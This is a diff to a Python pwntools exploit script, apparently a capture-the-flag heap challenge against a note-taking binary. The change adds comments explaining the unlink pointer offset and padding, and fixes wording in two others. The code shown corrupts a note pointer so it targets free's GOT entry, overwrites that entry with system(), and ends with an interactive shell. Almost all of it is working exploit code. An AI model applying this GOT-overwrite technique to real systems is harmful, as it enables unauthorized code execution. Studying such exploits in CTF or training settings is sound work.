@@ -201,12 +201,15 @@ if __name__ == "__main__":
 
     # delete_note(1) makes target points to itself (to be precise, -24 bytes)
     #
+    # since, chunk0->ptr points &chunk->ptr-24, we need to prefix (3-qword)
+    # entire payload size should be same, or realloc() will break the entire exploit sequence apart
+    #
     # [COUNT 1] [OCCUPIED YES] [NOTE SIZE 8] [PTR to CHUNK]
     edit_note(0,payload_len, p64(1) + p64(1) + p64(8) + p64(b.got['free']) + 'x'*(payload_len-32))
 
     raw_input('after editing note_0->ptr to 0x602018...')
 
-    edit_note(0,8, p64(libc_base+libc.symbols['system']))       # now aligned (no need add 3-qword prefix)
+    edit_note(0,8, p64(libc_base+libc.symbols['system']))       # now aligned (no need to add 3-qword prefix)
 
     raw_input('after editing note_0->ptr to system()...')
 
@@ -218,6 +221,6 @@ if __name__ == "__main__":
     r.send('1\n')
     print r.recv()
 
-    delete_note(17) # need refactoring. add '/bin/sh' first. recalc offset.
+    delete_note(17) # needs refactoring. add '/bin/sh' first. recalc offset.
 
     r.interactive()
